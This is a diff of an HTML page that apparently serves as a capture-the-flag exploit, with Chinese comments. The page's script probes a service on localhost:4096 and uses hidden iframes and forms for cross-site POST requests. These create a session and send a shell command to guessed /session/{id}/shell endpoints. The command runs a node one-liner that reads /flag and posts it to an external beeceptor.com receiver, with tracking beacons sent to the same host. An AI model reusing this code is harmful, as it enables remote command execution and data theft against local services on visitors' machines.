@@ -1,58 +1,69 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
 <body>
 <script>
 (function() {
-    const EXFIL = "http://123333.free.beeceptor.com";   // 你的接收端
+    // 替换为你的接收端地址
+    const EXFIL = "https://1233334.free.beeceptor.com";
     const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
-    const LOC = encodeURIComponent(location.href);
-    const REF = encodeURIComponent(document.referrer || "");
 
     function beacon(action, extra) {
         let img = new Image();
-        img.src = `${EXFIL}/log?run=${RUN_ID}&loc=${LOC}&ref=${REF}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
+        img.src = `${EXFIL}/log?run=${RUN_ID}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
     }
 
-    const EXFIL_FLAG = `${EXFIL}/flag?run=${RUN_ID}`;
-    const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL_FLAG}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
+    // Payload: 使用 node 修改 flag 权限并外发
+    const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL}/flag?run=${RUN_ID}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
 
-    const TARGET_PORT = 4096;
-    const BASE = `http://localhost:${TARGET_PORT}`;
+    const BASE = 'http://localhost:4096';
 
-    // 发送简单 POST 请求（application/x-www-form-urlencoded），不会触发 CORS 预检
-    function sendPost(url, body) {
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: body,
-            mode: 'no-cors'
-        }).catch(e => beacon('fetch_err', `url=${encodeURIComponent(url)}&err=${e.message}`));
+    // 通过隐藏 iframe 提交表单，避免页面跳转
+    function postForm(url, data) {
+        let iframe = document.createElement('iframe');
+        iframe.name = 'hiddenFormTarget';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        let form = document.createElement('form');
+        form.method = 'POST';
+        form.action = url;
+        form.target = 'hiddenFormTarget';
+        form.style.display = 'none';
+        for (let key in data) {
+            let input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = key;
+            input.value = data[key];
+            form.appendChild(input);
+        }
+        document.body.appendChild(form);
+        form.submit();
+        setTimeout(() => {
+            form.remove();
+            iframe.remove();
+        }, 1000);
     }
-
-    function exploit() {
-        beacon('exploit_start');
-        // 创建 session（空表单）
-        sendPost(BASE + '/session', '');
-        // 发送命令到 session/1/shell
-        const shellUrl = BASE + '/session/1/shell';
-        const body = `command=${encodeURIComponent(PAYLOAD)}`;
-        sendPost(shellUrl, body);
-        beacon('exploit_done');
-    }
-
-    let iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = `http://localhost:${TARGET_PORT}/`;
-    iframe.onload = () => {
-        beacon('port_open', `port=${TARGET_PORT}`);
-        exploit();
-    };
-    iframe.onerror = () => beacon('port_error', `port=${TARGET_PORT}`);
-    document.body.appendChild(iframe);
-    setTimeout(() => iframe.remove(), 3000);
 
     beacon('start');
+
+    // 探测端口 4096 是否开放
+    let probe = document.createElement('iframe');
+    probe.style.display = 'none';
+    probe.src = BASE + '/';
+    probe.onload = () => {
+        beacon('port_open');
+        // 第一步：创建会话，让服务端设置 Cookie
+        postForm(BASE + '/session', {});
+        // 第二步：稍等片刻，发送命令（尝试多个可能的 session id）
+        setTimeout(() => {
+            const ids = ['1', '2', '3', 'session', 'default', 'test-session-123'];
+            ids.forEach(id => {
+                postForm(BASE + `/session/${id}/shell`, { command: PAYLOAD });
+            });
+            beacon('exploit_sent');
+        }, 1000);
+    };
+    probe.onerror = () => beacon('port_error');
+    document.body.appendChild(probe);
 })();
 </script>
 </body>
